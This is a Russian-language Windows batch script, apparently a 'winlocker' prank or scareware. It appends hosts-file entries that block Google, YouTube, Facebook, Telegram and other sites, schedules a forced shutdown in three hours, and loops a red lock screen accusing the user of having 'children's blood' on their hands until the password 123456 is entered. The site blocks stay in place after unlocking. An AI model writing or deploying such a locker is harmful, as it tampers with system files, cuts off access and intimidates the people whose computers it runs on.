@echo off
color 4F
title Ваш ПК заблокирован
mode con: cols=100 lines=40

:: Блок сайтов (нужны права админа)
echo 127.0.0.1 google.com >> %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 youtube.com >> %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 facebook.com >> %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 telegram.com >> %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 nekto.me >> %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 rezka.ag >> %windir%\System32\drivers\etc\hosts

:: Обратный отсчёт (3 часа — 10800 секунд)
shutdown /s /t 10800

:: Тело блокировки
:loop
cls
echo ================================================================
echo     ВАШ ПК ЗАБЛОКИРОВАН!
echo     Кровь детей на ваших руках!
echo.
echo     Чтобы разблокировать, введите пароль.
echo ================================================================
set /p pass=Пароль: 

if "%pass%"=="123456" goto unlock

echo.
echo ❌ Неверный пароль! Попробуйте снова...
timeout /t 2 >nul
goto loop

:unlock
shutdown /a
echo ✅ ПК разблокирован. Пароль верный.
pause
exit
